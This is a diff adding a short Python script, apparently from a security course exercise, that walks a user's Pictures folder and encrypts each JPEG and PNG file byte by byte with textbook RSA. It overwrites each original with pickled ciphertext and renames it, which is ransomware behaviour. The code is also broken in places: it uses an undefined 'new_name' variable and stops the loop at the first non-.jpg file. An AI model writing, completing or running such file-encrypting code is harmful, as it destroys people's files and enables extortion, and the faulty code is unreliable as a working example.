@@ -1,0 +1,30 @@
+#!/usr/bin/python3
+import sys
+import pickle
+from os import listdir
+import os
+Usage = f'''
+python3 {__file__} <n> <e> <file>
+'''
+n = 22291846172619859445381409012451
+e =  65535
+for file in listdir('/home/csc2023/Pictures/'):
+    if not file.endswith('.jpg'):
+        break
+    filename = file
+    plain_bytes = b''
+    with open(f'/home/csc2023/Pictures/{filename}', 'rb') as f:
+        plain_bytes = f.read()
+    file_format = plain_bytes[:4]
+    if file_format == b'\xff\xd8\xff\xe0':
+        cipher_int = [pow(i, e, n) for i in plain_bytes]
+        with open(f'/home/csc2023/Pictures/{filename}', 'wb') as f:
+            pickle.dump(cipher_int, f)
+            os.rename(f'/home/csc2023/Pictures/{filename}',f'/home/csc2023/Pictures/{new_name}') 
+    if file_format == b'\x89PNG':
+        cipher_int = [pow(i, e, n) for i in plain_bytes]
+        with open(f'/home/csc2023/Pictures/{filename}', 'wb') as f:
+            pickle.dump(cipher_int, f)
+            os.rename(f'/home/csc2023/Pictures/{filename}',f'/home/csc2023/Pictures/{new_name}')
+    
+
